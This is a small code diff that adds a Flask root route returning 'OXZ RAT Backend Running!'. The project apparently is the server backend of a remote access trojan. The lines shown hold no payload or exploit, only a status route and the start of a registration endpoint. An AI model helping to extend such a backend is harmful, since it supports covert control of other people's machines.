@@ -17,6 +17,10 @@ def init_db():
     conn.commit()
     conn.close()
 
+@app.route('/')
+def home():
+    return jsonify({'message': 'OXZ RAT Backend Running!'})
+
 @app.route('/api/register', methods=['POST'])
 def register():
     data = request.json
